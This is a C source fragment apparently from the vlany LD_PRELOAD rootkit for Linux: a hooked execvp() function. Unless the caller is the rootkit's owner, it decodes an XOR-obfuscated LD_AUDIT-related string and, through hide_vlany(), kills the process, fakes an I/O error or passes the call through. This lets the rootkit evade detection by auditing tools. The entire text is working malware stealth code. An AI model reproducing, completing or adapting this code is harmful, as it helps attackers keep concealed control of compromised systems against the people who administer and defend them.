int execvp(const char *filename, char *const argv[])
{
    #ifdef DEBUG
        printf("[vlany] execvp() called\n");
    #endif

    HOOK(old_execvp, CEXECVP);

    if(owned()) return old_execvp(filename, argv);

    char *ld_audit_getenv = strdup(LD_AUDIT_GETENV); xor(ld_audit_getenv);
    int ret = 0, check_ld_audit = hide_vlany(filename, ld_audit_getenv, ret);
    CLEAN(ld_audit_getenv);
    if(check_ld_audit == 1) exit(0);
    else if(check_ld_audit == 0){
        errno = EIO;
        return -1;
    }else if(check_ld_audit == -1) return -1;
    else if(check_ld_audit == 2) return old_execvp(filename, argv);

    return old_execvp(filename, argv);
}

